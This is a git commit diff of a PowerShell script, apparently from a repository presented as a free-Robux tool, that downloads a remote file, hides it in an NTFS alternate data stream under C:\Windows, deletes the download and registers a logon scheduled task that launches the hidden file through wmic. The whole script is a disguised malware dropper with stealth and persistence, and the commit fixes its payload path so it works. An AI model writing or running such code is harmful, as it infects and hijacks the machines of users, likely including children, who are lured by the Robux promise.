5b45499c709f6fbf75857073598aacad2796421a
Abdullah Zafar <102247412+HadronCollision@users.noreply.github.com>
2025-08-01 12:08:53 +0500

    Update script5.ps1

--- script5.ps1
+++ script5.ps1
@@ -4,10 +4,10 @@ Write-Host " by Hadron" -ForegroundColor DarkGray
 Write-Host
 $name = Read-Host "code"
 Write-Host "Downloading..." -ForegroundColor DarkCyan
-curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/russianhuzz -o russianhuzz5
+curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/russianhuzz5 -o russianhuzz5
 Write-Host "Installing..." -ForegroundColor DarkCyan
 cmd.exe /c "type russianhuzz5 > C:\Windows:Explorer"
-rm .\russianhuzz
+rm .\russianhuzz5
 $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c wmic process call create `"C:\Windows:Explorer $name`""
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 1000000
